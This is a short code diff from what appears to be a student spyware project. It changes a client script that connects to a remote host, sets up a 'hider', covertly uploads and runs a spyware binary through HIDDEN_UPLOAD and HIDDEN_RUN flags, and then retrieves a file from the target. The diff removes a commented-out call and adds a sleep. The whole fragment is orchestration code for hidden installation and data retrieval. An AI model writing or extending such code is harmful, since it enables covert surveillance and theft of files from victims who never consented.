@@ -21,13 +21,7 @@ def main():
         )
     )
     print(agent.hider_setup(targetHiderPath))
-    # print(
-    #     agent.hidden_action_with_upload(
-    #         FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
-    #         "/home/avner/Arazim-Projects-2024---spyware/spyware",
-    #         "runingSpyware.o",
-    #     )
-    # )
+
     print(
         agent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
@@ -35,6 +29,7 @@ def main():
             "sentSpyware.spy",
         )
     )
+    sleep(2)
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.hider_setup(targetHiderPath))
     print(spyAgent.retrieve_file("fishfish.txt"))
